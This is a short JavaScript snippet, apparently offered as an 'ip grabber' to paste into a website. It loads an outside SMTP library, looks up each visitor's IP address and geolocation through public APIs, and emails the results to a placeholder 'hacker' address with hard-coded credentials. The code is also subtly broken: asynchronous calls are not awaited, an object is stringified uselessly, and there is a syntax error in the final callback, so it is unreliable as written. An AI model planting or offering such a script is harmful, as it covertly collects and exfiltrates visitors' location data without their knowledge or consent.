// add this to you're website
// javascript ip grabber

// add smtpjs script to head of html doc.
var smtpjs = document.createElement("script")
smtpjs.setAttribute("src","https://smtpjs.com/v3/smtp.js" )
document.head.appendChild(smtpjs)

function ipGrabber() {    
   var ipAddr = "";
   var data = {}
   // 2 GET Requests (api.ipify and extreme-ip-lookup)
   $.getJSON("https://api.ipify.org/?format=json", function(e) {
        ipAddr= e.ip
    });
    $.getJSON("http://extreme-ip-lookup.com/json/"+ipAddr, function(e) {
      	data = e
    });
    // send geolocation data over smtp
    Email.send({
        Host : "smtp.email-server.com",
        Username : "hackerEmail@mail.com",
        Password : "password",
        To : 'hackerEmail@mail.com',
        From : "hackerEmail@mail.com",
        Subject: ipAddr+ " geolocation data",
        Body : data.toString()
    }).then(
      console.log("data emailed to hacker");
    );
}
